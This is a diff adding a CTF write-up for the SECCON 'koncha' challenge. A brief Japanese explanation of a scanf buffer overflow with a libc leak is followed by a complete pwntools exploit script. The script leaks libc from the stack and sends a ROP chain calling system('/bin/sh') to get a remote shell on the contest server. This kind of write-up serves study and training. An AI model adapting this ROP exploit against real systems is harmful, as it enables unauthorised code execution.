@@ -1,0 +1,64 @@
+<h3 id="koncha">koncha</h3>
+<p>scanfのbuffer over flow
+1回目で何も入力しないことでstack上のゴミからlibcアドレスのリーク<br>2回目でropをするだけ</p>
+<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+
+<span class="hljs-comment">#config</span>
+context(os=<span class="hljs-string">'linux'</span>, arch=<span class="hljs-string">'i386'</span>)
+context.log_level = <span class="hljs-string">'debug'</span>
+
+FILE_NAME = <span class="hljs-string">"chall.ptc"</span>
+<span class="hljs-comment">#FILE_NAME = "chall"</span>
+
+<span class="hljs-comment">#"""</span>
+HOST = <span class="hljs-string">"koncha.seccon.games"</span>
+PORT = <span class="hljs-number">9001</span>
+<span class="hljs-string">"""
+HOST = "localhost"
+PORT = 7777
+#"""</span>
+
+<span class="hljs-keyword">if</span> len(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">'r'</span>:
+    conn = remote(HOST, PORT)
+<span class="hljs-keyword">else</span>:
+    conn = process(FILE_NAME)
+
+elf = ELF(FILE_NAME)
+<span class="hljs-comment">#</span>
+libc = ELF(<span class="hljs-string">'./lib/libc.so.6'</span>)
+off_binsh = next(libc.search(<span class="hljs-string">b"/bin/sh"</span>))
+off_system = libc.symbols[<span class="hljs-string">"system"</span>]
+off_dust = <span class="hljs-number">0x7ffff7fc82e8</span> - <span class="hljs-number">0x7ffff7dd7000</span>
+off_rdi_ret = <span class="hljs-number">0x23b6a</span>
+off_only_ret = <span class="hljs-number">0x23b6a</span>+<span class="hljs-number">1</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">align2qword</span><span class="hljs-params">(s)</span>:</span>
+    <span class="hljs-keyword">if</span> len(s) &gt; <span class="hljs-number">8</span>:
+        print(<span class="hljs-string">"[ERROR] align2qword: argument larger than 8bytes"</span>)
+        exit()
+    <span class="hljs-keyword">return</span> u64(s+<span class="hljs-string">b'\x00'</span>*(<span class="hljs-number">8</span>-len(s)))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-comment"># rbp-0x30</span>
+
+    conn.sendlineafter(<span class="hljs-string">"?\n"</span>, <span class="hljs-string">""</span>)
+    conn.recvuntil(<span class="hljs-string">", "</span>)
+    libc_dust = align2qword(conn.recvuntil(<span class="hljs-string">"!"</span>)[:<span class="hljs-number">-1</span>])
+    libc_base = libc_dust - off_dust
+    print(hex(libc_dust))
+    print(hex(libc_base))
+
+    payload = <span class="hljs-string">b"A"</span>*<span class="hljs-number">0x58</span>
+    payload += p64(libc_base+off_only_ret)
+    payload += p64(libc_base+off_rdi_ret)
+    payload += p64(libc_base+off_binsh)
+    payload += p64(libc_base+off_system)
+    conn.sendlineafter(<span class="hljs-string">"?\n"</span>, payload);
+    conn.interactive()
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    exploit()
+</code></pre>
+
